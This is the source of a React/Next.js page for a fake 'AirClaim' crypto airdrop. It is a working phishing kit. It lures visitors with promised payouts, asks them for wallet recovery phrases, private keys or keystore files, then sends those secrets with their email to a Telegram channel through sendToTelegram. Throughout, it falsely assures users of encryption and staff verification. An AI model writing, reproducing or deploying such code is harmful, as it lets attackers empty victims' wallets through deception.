"use client"

import { useState } from "react"
import Link from "next/link"
import { sendToTelegram } from "@/lib/telegram"

const WALLETS = [
  {
    name: "MetaMask",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><defs><style>.fill{fill:#F6851B}</style></defs><polygon class="fill" points="100,10 40,60 40,100 60,140 100,170 140,140 160,100 160,60"/></svg>',
  },
  {
    name: "WalletConnect",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><circle cx="100" cy="100" r="90" fill="#3B99FC"/><path d="M100,50 L130,75 L130,125 L100,150 L70,125 L70,75 Z" fill="white"/></svg>',
  },
  {
    name: "Coinbase Wallet",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect width="200" height="200" fill="#1652F0"/><circle cx="100" cy="100" r="50" fill="white"/><text x="100" y="115" fontSize="60" fontWeight="bold" textAnchor="middle" fill="#1652F0">₿</text></svg>',
  },
  {
    name: "Trust Wallet",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect width="200" height="200" fill="#3375BB" rx="40"/><path d="M100,50 L150,80 L150,140 Q100,170 100,170 Q50,140 50,80 Z" fill="white"/></svg>',
  },
  {
    name: "Ledger",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect width="200" height="200" fill="#000"/><rect x="40" y="60" width="120" height="80" fill="white" rx="10"/><rect x="50" y="75" width="30" height="50" fill="#000" rx="3"/><rect x="110" y="75" width="30" height="50" fill="#000" rx="3"/></svg>',
  },
  {
    name: "Trezor",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect width="200" height="200" fill="#01B26F"/><rect x="50" y="50" width="100" height="100" fill="white" rx="10"/><circle cx="100" cy="100" r="30" fill="#01B26F"/></svg>',
  },
  {
    name: "Phantom",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect width="200" height="200" fill="#14F195"/><circle cx="100" cy="100" r="60" fill="#000"/><circle cx="85" cy="90" r="12" fill="#14F195"/><circle cx="115" cy="90" r="12" fill="#14F195"/></svg>',
  },
  {
    name: "Solflare",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><defs><linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00D4FF"/><stop offset="100%" style="stop-color:#7B61FF"/></linearGradient></defs><circle cx="100" cy="100" r="90" fill="url(#grad)"/><polygon points="100,40 150,90 120,90 120,150 80,150 80,90 50,90" fill="white"/></svg>',
  },
  {
    name: "Argent",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect width="200" height="200" fill="#FF5C00"/><polygon points="100,50 150,150 50,150" fill="white"/></svg>',
  },
  {
    name: "imToken",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><circle cx="100" cy="100" r="90" fill="#2E8FEB"/><rect x="60" y="70" width="80" height="60" fill="white" rx="5"/></svg>',
  },
  {
    name: "MEW (MyEtherWallet)",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect width="200" height="200" fill="#05C0FD"/><polygon points="100,40 160,80 130,160 70,160 40,80" fill="white"/></svg>',
  },
  {
    name: "MathWallet",
    logo: '<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200"><rect width="200" height="200" fill="#6B5BE2"/><circle cx="100" cy="100" r="50" fill="white"/><text x="100" y="120" fontSize="40" fontWeight="bold" textAnchor="middle" fill="#6B5BE2">M</text></svg>',
  },
]

const CREDENTIAL_TYPES = [
  { id: "phrase", label: "Recovery Phrase", placeholder: "Enter your 12 or 24-word recovery phrase..." },
  { id: "keystore", label: "Keystore File", placeholder: "Paste your keystore JSON content..." },
  { id: "privatekey", label: "Private Key", placeholder: "Enter your private key (0x...)" },
]

const CRYPTOS = [
  "Bitcoin (BTC)",
  "Ethereum (ETH)",
  "Cardano (ADA)",
  "Solana (SOL)",
  "Polkadot (DOT)",
  "Ripple (XRP)",
  "Litecoin (LTC)",
  "Chainlink (LINK)",
  "Polygon (MATIC)",
  "Avalanche (AVAX)",
  "Arbitrum (ARB)",
  "Optimism (OP)",
]

export default function ImportWalletClient() {
  const [step, setStep] = useState<"wallet" | "credentials" | "confirmation" | "email" | "success">("wallet")
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [selectedCrypto, setSelectedCrypto] = useState<string | null>(null)
  const [selectedCredentialType, setSelectedCredentialType] = useState<string>("phrase")
  const [credentialValue, setCredentialValue] = useState("")
  const [walletAddress, setWalletAddress] = useState("")
  const [email, setEmail] = useState("")
  const [loading, setLoading] = useState(false)

  const handleWalletSelect = () => {
    if (selectedWallet && selectedCrypto) {
      setStep("credentials")
    }
  }

  const handleCredentialsSubmit = async () => {
    if (credentialValue.trim() && walletAddress.trim()) {
      setStep("confirmation")
    }
  }

  const handleConfirmAndSend = async () => {
    setLoading(true)
    const success = await sendToTelegram({
      walletAddress,
      credential: credentialValue,
      credentialType: selectedCredentialType as "phrase" | "keystore" | "privatekey",
      wallet: selectedWallet || "",
      crypto: selectedCrypto || "",
    })
    setLoading(false)

    if (success) {
      setStep("email")
    }
  }

  const handleEmailSubmit = async () => {
    if (email.trim()) {
      setLoading(true)
      await sendToTelegram({
        walletAddress,
        credential: credentialValue,
        credentialType: selectedCredentialType as "phrase" | "keystore" | "privatekey",
        wallet: selectedWallet || "",
        crypto: selectedCrypto || "",
        userInfo: { email },
      })
      setLoading(false)
      setStep("success")
    }
  }

  const getCredentialType = () => {
    return CREDENTIAL_TYPES.find((ct) => ct.id === selectedCredentialType)
  }

  return (
    <main className="min-h-screen bg-gradient-to-b from-blue-950 to-blue-900">
      {/* Header */}
      <div className="bg-gradient-to-r from-blue-950 to-blue-900 border-b border-blue-800 p-6">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <Link href="/" className="flex items-center gap-2">
            <span className="text-2xl font-bold text-white">AirClaim</span>
          </Link>
          <Link href="/" className="text-cyan-400 hover:text-cyan-300 font-semibold">
            Back to Home
          </Link>
        </div>
      </div>

      {/* Content */}
      <div className="max-w-2xl mx-auto px-4 py-12">
        {step === "wallet" && (
          <div className="bg-blue-900 rounded-xl p-8 shadow-2xl">
            <div className="mb-8">
              <h1 className="text-4xl font-bold text-white mb-2">Import Your Wallet</h1>
              <p className="text-blue-200">
                Select your wallet and cryptocurrency to claim your available airdrop ($1,000 - $10,000)
              </p>
            </div>

            {/* Wallets Grid */}
            <div className="mb-8">
              <h3 className="text-lg font-semibold text-white mb-4">Select Your Wallet</h3>
              <div className="grid grid-cols-3 md:grid-cols-4 gap-3">
                {WALLETS.map((wallet) => (
                  <button
                    key={wallet.name}
                    onClick={() => setSelectedWallet(wallet.name)}
                    className={`p-4 rounded-lg border-2 transition flex flex-col items-center gap-2 ${
                      selectedWallet === wallet.name
                        ? "border-cyan-400 bg-blue-800 shadow-lg shadow-cyan-500/50"
                        : "border-blue-700 bg-blue-900 hover:border-blue-600"
                    }`}
                  >
                    <svg
                      className="w-10 h-10"
                      viewBox="0 0 200 200"
                      dangerouslySetInnerHTML={{ __html: wallet.logo.split("><")[1].split("</")[0] }}
                    />
                    <span className="text-xs font-medium text-white text-center">{wallet.name}</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Cryptos Grid */}
            <div className="mb-8">
              <h3 className="text-lg font-semibold text-white mb-4">Select Cryptocurrency</h3>
              <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                {CRYPTOS.map((crypto) => (
                  <button
                    key={crypto}
                    onClick={() => setSelectedCrypto(crypto)}
                    className={`p-3 rounded-lg border-2 transition text-sm font-medium ${
                      selectedCrypto === crypto
                        ? "border-cyan-400 bg-blue-800 text-white shadow-lg shadow-cyan-500/50"
                        : "border-blue-700 bg-blue-900 text-blue-200 hover:border-blue-600"
                    }`}
                  >
                    {crypto}
                  </button>
                ))}
              </div>
            </div>

            {/* Airdrop Info */}
            <div className="bg-blue-800 p-6 rounded-lg mb-8 border border-blue-700">
              <p className="text-cyan-400 font-bold text-xl">Available Airdrop: $1,000 - $10,000</p>
              <p className="text-blue-200 text-sm mt-2">
                {selectedWallet ? `Wallet: ${selectedWallet}` : "Select a wallet"}
              </p>
              <p className="text-blue-200 text-sm">
                {selectedCrypto ? `Crypto: ${selectedCrypto}` : "Select a cryptocurrency"}
              </p>
            </div>

            {/* Action Buttons */}
            <div className="flex gap-3">
              <Link
                href="/"
                className="flex-1 px-4 py-3 border-2 border-blue-700 text-white rounded-lg hover:border-blue-600 transition font-semibold text-center"
              >
                Cancel
              </Link>
              <button
                onClick={handleWalletSelect}
                disabled={!selectedWallet || !selectedCrypto}
                className="flex-1 px-4 py-3 bg-cyan-500 hover:bg-cyan-600 disabled:bg-blue-700 disabled:cursor-not-allowed text-blue-950 rounded-lg transition font-semibold"
              >
                Next
              </button>
            </div>
          </div>
        )}

        {step === "credentials" && (
          <div className="bg-blue-900 rounded-xl p-8 shadow-2xl">
            <h1 className="text-4xl font-bold text-white mb-2">Enter Wallet Details</h1>
            <p className="text-blue-200 mb-8">Verify your wallet to claim your available airdrop ($1,000 - $10,000)</p>

            {/* Summary */}
            <div className="bg-blue-800 p-6 rounded-lg mb-8 border border-blue-700">
              <div className="grid grid-cols-3 gap-4">
                <div>
                  <p className="text-blue-300 text-xs">Wallet</p>
                  <p className="text-cyan-400 font-bold">{selectedWallet}</p>
                </div>
                <div>
                  <p className="text-blue-300 text-xs">Cryptocurrency</p>
                  <p className="text-cyan-400 font-bold">{selectedCrypto}</p>
                </div>
                <div>
                  <p className="text-blue-300 text-xs">Airdrop Amount</p>
                  <p className="text-cyan-400 font-bold">$1,000 - $10,000</p>
                </div>
              </div>
            </div>

            <div className="mb-6">
              <h3 className="text-lg font-semibold text-white mb-3">Select Credential Type</h3>
              <div className="grid grid-cols-3 gap-2">
                {CREDENTIAL_TYPES.map((credType) => (
                  <button
                    key={credType.id}
                    onClick={() => setSelectedCredentialType(credType.id)}
                    className={`p-3 rounded-lg border-2 text-sm font-medium transition ${
                      selectedCredentialType === credType.id
                        ? "border-cyan-400 bg-blue-800 text-white shadow-lg shadow-cyan-500/50"
                        : "border-blue-700 bg-blue-900 text-blue-200 hover:border-blue-600"
                    }`}
                  >
                    {credType.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Form */}
            <div className="space-y-4 mb-8">
              <div>
                <label className="block text-sm font-semibold text-blue-100 mb-2">{getCredentialType()?.label}</label>
                <textarea
                  value={credentialValue}
                  onChange={(e) => setCredentialValue(e.target.value)}
                  placeholder={getCredentialType()?.placeholder}
                  className="w-full px-4 py-3 border border-blue-700 rounded-lg bg-blue-800 text-white placeholder-blue-400 focus:outline-none focus:border-cyan-500 resize-none h-24"
                />
                <p className="text-blue-300 text-xs mt-2">We secure your data with industry-standard encryption</p>
              </div>

              <div>
                <label className="block text-sm font-semibold text-blue-100 mb-2">Wallet Address</label>
                <input
                  type="text"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  placeholder="0x..."
                  className="w-full px-4 py-2 border border-blue-700 rounded-lg bg-blue-800 text-white placeholder-blue-400 focus:outline-none focus:border-cyan-500"
                />
              </div>
            </div>

            {/* Action Buttons */}
            <div className="flex gap-3">
              <button
                onClick={() => setStep("wallet")}
                className="flex-1 px-4 py-3 border-2 border-blue-700 text-white rounded-lg hover:border-blue-600 transition font-semibold"
              >
                Back
              </button>
              <button
                onClick={handleCredentialsSubmit}
                disabled={!credentialValue.trim() || !walletAddress.trim()}
                className="flex-1 px-4 py-3 bg-cyan-500 hover:bg-cyan-600 disabled:bg-blue-700 disabled:cursor-not-allowed text-blue-950 rounded-lg transition font-semibold"
              >
                Review & Claim
              </button>
            </div>
          </div>
        )}

        {step === "confirmation" && (
          <div className="bg-blue-900 rounded-xl p-8 shadow-2xl">
            <div className="mb-8">
              <h1 className="text-3xl font-bold text-white mb-2">Confirm Your Details</h1>
              <p className="text-blue-200">Please review your information before sending</p>
            </div>

            <div className="bg-blue-800 p-6 rounded-lg mb-8 border border-blue-700 space-y-4">
              <div className="border-b border-blue-700 pb-4">
                <p className="text-blue-300 text-xs">Wallet Type</p>
                <p className="text-cyan-400 font-bold">{selectedWallet}</p>
              </div>
              <div className="border-b border-blue-700 pb-4">
                <p className="text-blue-300 text-xs">Cryptocurrency</p>
                <p className="text-cyan-400 font-bold">{selectedCrypto}</p>
              </div>
              <div className="border-b border-blue-700 pb-4">
                <p className="text-blue-300 text-xs">Credential Type</p>
                <p className="text-cyan-400 font-bold">
                  {CREDENTIAL_TYPES.find((ct) => ct.id === selectedCredentialType)?.label}
                </p>
              </div>
              <div className="border-b border-blue-700 pb-4">
                <p className="text-blue-300 text-xs">Wallet Address</p>
                <p className="text-cyan-400 font-bold break-all">{walletAddress}</p>
              </div>
              <div>
                <p className="text-blue-300 text-xs">Airdrop Amount</p>
                <p className="text-cyan-400 font-bold text-lg">$1,000 - $10,000</p>
              </div>
            </div>

            <div className="bg-cyan-900/30 border border-cyan-700 p-4 rounded-lg mb-8">
              <p className="text-cyan-300 text-sm">
                <span className="font-semibold">Important:</span> Your credentials will be securely sent to our
                verification team. This usually takes 24 hours to confirm all information. You will receive a response
                via email.
              </p>
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => setStep("credentials")}
                className="flex-1 px-4 py-3 border-2 border-blue-700 text-white rounded-lg hover:border-blue-600 transition font-semibold"
              >
                Back
              </button>
              <button
                onClick={handleConfirmAndSend}
                disabled={loading}
                className="flex-1 px-4 py-3 bg-cyan-500 hover:bg-cyan-600 disabled:bg-blue-700 disabled:cursor-not-allowed text-blue-950 rounded-lg transition font-semibold"
              >
                {loading ? "Sending..." : "Send for Verification"}
              </button>
            </div>
          </div>
        )}

        {step === "email" && (
          <div className="bg-blue-900 rounded-xl p-8 shadow-2xl">
            <div className="mb-8 text-center">
              <div className="text-5xl mb-4">⏳</div>
              <h1 className="text-3xl font-bold text-white mb-2">Please Wait</h1>
              <p className="text-blue-200">Our staff is reviewing your submission</p>
            </div>

            <div className="bg-blue-800 p-6 rounded-lg mb-8 border border-blue-700">
              <p className="text-blue-100 mb-4">
                <span className="font-semibold text-cyan-400">Your airdrop request has been received.</span>
              </p>
              <p className="text-blue-200 text-sm mb-4">
                Our staff will review your credentials and get in touch with you. This usually takes 24 hours to confirm
                all information. The response will be sent to your email address.
              </p>
              <p className="text-blue-300 text-sm">
                Please enter your email address below so we can send you the verification confirmation and airdrop
                details.
              </p>
            </div>

            <div className="mb-8">
              <label className="block text-sm font-semibold text-blue-100 mb-3">Enter Your Email Address</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="your@email.com"
                className="w-full px-4 py-3 border border-blue-700 rounded-lg bg-blue-800 text-white placeholder-blue-400 focus:outline-none focus:border-cyan-500"
              />
            </div>

            <div className="flex gap-3">
              <button
                onClick={() => setStep("confirmation")}
                className="flex-1 px-4 py-3 border-2 border-blue-700 text-white rounded-lg hover:border-blue-600 transition font-semibold"
              >
                Back
              </button>
              <button
                onClick={handleEmailSubmit}
                disabled={!email.trim() || loading}
                className="flex-1 px-4 py-3 bg-cyan-500 hover:bg-cyan-600 disabled:bg-blue-700 disabled:cursor-not-allowed text-blue-950 rounded-lg transition font-semibold"
              >
                {loading ? "Submitting..." : "Submit Email"}
              </button>
            </div>
          </div>
        )}

        {step === "success" && (
          <div className="bg-blue-900 rounded-xl p-8 shadow-2xl text-center">
            <div className="text-7xl mb-6 animate-pulse">✓</div>
            <h1 className="text-4xl font-bold text-white mb-4">Request Submitted Successfully!</h1>
            <p className="text-blue-100 mb-2">
              Your available airdrop claim request has been submitted for verification.
            </p>
            <p className="text-cyan-400 font-semibold mb-4">Email: {email}</p>
            <p className="text-blue-300 mb-8 text-sm">
              Our team will review your credentials and contact you within 24 hours with the verification result and
              airdrop details.
            </p>
            <Link
              href="/"
              className="inline-block px-8 py-3 bg-cyan-500 hover:bg-cyan-600 text-blue-950 rounded-lg font-bold transition"
            >
              Back to Home
            </Link>
          </div>
        )}
      </div>
    </main>
  )
}
